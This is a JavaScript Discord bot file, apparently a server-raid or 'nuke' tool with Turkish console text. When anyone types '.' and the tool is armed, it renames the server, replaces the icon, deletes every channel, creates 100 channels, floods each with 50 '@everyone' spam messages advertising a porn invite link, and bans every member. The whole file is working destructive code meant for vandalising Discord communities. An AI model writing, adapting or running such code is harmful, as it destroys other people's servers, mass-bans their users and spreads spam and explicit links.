const tokens = require('./tokens.json')
const Discord = require('discord.js'),
client = new Discord.Client()
require('./bot2')
var st = "disabled"

client.on("ready", ()=>{
    
    console.log("Hazırım birader (ENGINE 1) ", client.user.tag)
})

client.on("message", (message)=>{
    if(message.author.bot) return false
    if(message.content==="."){
        if(st==="enabled"){
           message.guild.setName("SUNUCU ADI")
            message.guild.setIcon("https://cdn.discordapp.com/attachments/848975882453778492/848996534694969364/sedat-peker-GNMr_cover.png")
            message.guild.channels.cache.map(channel=>channel.delete())
           for(var i=0; i<100; i++){
               message.guild.channels.create("kanal-adi", "text").then((ch)=>{
                 for(var i=0; i<50; i++){
ch.send("**discord.gg/pornhub SPAM MESAJI @everyone**")}
                })
                message.guild.members.cache.map((member)=>member.ban())
                
               
               
           
            }
        }
}
    
})

client.login(tokens.engine).catch(console.error)
